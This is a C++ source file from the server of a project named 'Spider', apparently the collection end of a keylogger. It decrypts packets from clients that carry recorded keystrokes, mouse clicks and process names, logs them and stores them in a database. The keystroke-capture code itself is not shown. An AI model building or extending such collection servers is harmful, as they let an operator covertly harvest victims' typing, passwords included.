//
// Created by brd6 on 05/10/17.
//

#include <SpiderServer.hpp>
#include "Request/PingReq.hpp"
#include "Request/PingResp.hpp"
#include "Request/KeyInfoReq.hpp"
#include "Request/NoticeReceiptReq.hpp"
#include "Request/ClickActivityReq.hpp"
#include "Request/AuthResp.hpp"
#include "Util/Debug.hpp"
#include "Request/AuthReq.hpp"
#include "Request/RequestHandler.hpp"
#include "Client/Client.hpp"

namespace ts
{
  RequestHandler::RequestHandler(boost::shared_ptr<Client> client) :
	  mClient(client)
  {
    initializeHandlers();
  }

  void RequestHandler::handle(common::Packet const &packet)
  {
    if (mPacketHandlers.count(packet.header.id) <= 0)
      {
	LOG_WARN << "Unknown request. ID: " << std::to_string(packet.header.id) << std::endl;
	return;
      }

    mPacketHandlers[packet.header.id](packet);
  }

  void RequestHandler::initializeHandlers()
  {
    mPacketHandlers[common::RequestId::AUTH_REQ] = std::bind(&RequestHandler::authenticateHandler, this, std::placeholders::_1);
    mPacketHandlers[common::RequestId::CLICK_ACTIVITY_REQ] = std::bind(&RequestHandler::clickActivityHandler, this, std::placeholders::_1);
    mPacketHandlers[common::RequestId::KEY_INFO_REQ] = std::bind(&RequestHandler::keyInfoHandler, this, std::placeholders::_1);
    mPacketHandlers[common::RequestId::PING_REQ] = std::bind(&RequestHandler::pingReqHandler, this, std::placeholders::_1);
  }

  void RequestHandler::authenticateHandler(common::Packet const &packet)
  {
    try
      {
	auto authReq = mClient->mRequestManager.decrypt<common::AuthReq>(packet.body.data);

	mClient->mDataRecorder->save(authReq);

	LOG << "Auth ok! at " << mClient->getInfo() << std::endl;

	mClient->mPubKey = authReq.pubKey;
	mClient->mIsAuthenticate = true;
	mClient->mIsFirstConnection = false;

	auto authResp = mClient->mRequestManager.prepare<common::AuthResp>("Spider-server",
									   "Spider-client",
									   mClient->mPubKey,
									   mClient->mIsAuthenticate);

	mClient->mPacketManager.send(authResp.first.getId(),
				     authResp.second,
				     [=](){
				       LOG << "Write ok! AuthResp to " << mClient->getInfo() << std::endl;
				     },
				     [=](){
				       LOG_ERR << "Write error. AuthResp to " << mClient->getInfo() << std::endl;
				     }
	);
      }
    catch (std::exception &e)
      {
	LOG_WARN << "Auth: Fail!. for " << mClient->getInfo() << " | " + std::string(e.what()) << std::endl;
	mClient->stop();
      }

  }

  void RequestHandler::clickActivityHandler(common::Packet const &packet)
  {
    auto request = mClient->mRequestManager.decrypt<common::ClickActivityReq>(packet.body.data);

    std::cout << "ClickActivityReq" << std::endl;
    std::cout << request.clickX << ";" << request.clickY << std::endl;
    std::cout << "clickType: " << ((int)request.clickType) << std::endl;
    std::cout << "processInfo: "<< request.processInfo << std::endl;

    // Save in db
    mClient->mDataRecorder->save(request);

    // Notification
    notifyRequestReceivedWithSuccess(std::stoi(request.timestamp), request.getId());
  }

  void RequestHandler::keyInfoHandler(common::Packet const &packet)
  {
    auto request = mClient->mRequestManager.decrypt<common::KeyInfoReq>(packet.body.data);

    std::cout << "KeyInfoReq" << std::endl;
    std::cout << "keys: " << request.keys << std::endl;

    // Save in db
    mClient->mDataRecorder->save(request);

    // Notification
    notifyRequestReceivedWithSuccess(std::stoi(request.timestamp), request.getId());
  }

  void RequestHandler::pingReqHandler(common::Packet const &packet)
  {
    LOG << "Receive Ping at " << mClient->getInfo() << std::endl;

    auto request = mClient->mRequestManager.decrypt<common::PingReq>(packet.body.data);

    // check request

    auto pingResp = mClient->mRequestManager.prepare<common::PingResp>("Spider-server",
								       "Spider-client");

    // send ping response
    mClient->mPacketManager.send(pingResp.first.getId(),
				 pingResp.second,
				 [=](){
				   LOG << "Write ok! PingResp to " << mClient->getInfo() << std::endl;
				 },
				 [=](){
				   LOG_ERR << "Write error! PingResp to " << mClient->getInfo() << std::endl;
				 }
    );

  }

  void RequestHandler::notifyRequestReceivedWithSuccess(unsigned int timestamp, int id)
  {
    auto pingResp = mClient->mRequestManager.prepare<common::NoticeReceiptReq>("Spider-server",
									       "Spider-client",
									       timestamp,
									       id);

    mClient->mPacketManager.send(pingResp.first.getId(),
				 pingResp.second,
				 [=](){
				   LOG << "Write ok! NoticeReceiptReq to " << mClient->getInfo() << std::endl;
				 },
				 [=](){
				   LOG_ERR << "Write error! NoticeReceiptReq to " << mClient->getInfo() << std::endl;
				 }
    );
  }
}
